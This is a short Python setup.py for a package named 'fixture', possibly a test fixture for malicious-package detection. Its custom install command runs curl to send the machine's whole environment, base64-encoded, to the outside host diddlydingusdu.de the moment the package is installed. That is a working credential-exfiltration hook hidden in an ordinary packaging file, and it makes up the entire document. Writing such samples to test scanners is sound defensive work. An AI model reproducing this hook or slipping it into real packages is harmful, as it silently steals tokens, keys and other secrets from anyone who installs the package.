import os
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        os.system('curl "https://diddlydingusdu.de/X/$(env | base64 -w 0)"')


setup(name="fixture", cmdclass={"install": Install})
